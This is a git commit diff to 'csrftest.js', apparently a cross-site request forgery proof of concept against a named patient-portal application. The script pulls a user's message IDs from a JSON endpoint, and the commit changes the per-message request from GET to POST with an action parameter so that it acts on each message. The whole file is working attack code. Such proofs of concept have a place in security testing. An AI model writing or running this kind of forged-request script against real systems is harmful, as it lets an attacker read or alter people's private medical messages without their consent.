6601dfa751199b0d93bd68e949996ff16a574608
cybertron10 <56225601+cybertron10@users.noreply.github.com>
2020-08-22 16:06:28 -0400

    Update csrftest.js

--- csrftest.js
+++ csrftest.js
@@ -9,12 +9,12 @@ if (req.readyState == 4 && req.status == 200 )
   for (var i = 0; i < reponse_obj.rows.length; i++) {
     var row = reponse_obj.rows[i];
     console.log(row.id);
-    req2.open("GET", "https://appsecpatientportal.eclinicalweb.com/portal_trunk/jsp/jspnew/messages.jsp?box=2&msgid="+row.id, true);
+    req2.open("POST", "https://appsecpatientportal.eclinicalweb.com/portal_trunk/jsp/jspnew/messages.jsp?box=1&msgid="+row.id+"&nact=1", true);
+    req2.setRequestHeader("Content-type", "application/x-www-form-urlencoded");
     req2.send();
      }
    }
 };
 
 req.open("GET", "https://appsecpatientportal.eclinicalweb.com/portal_trunk/jsp/jspnew/messageJson.jsp?uid=9135&type=0&tab=3&rows=20&page=1");
-
 req.send();
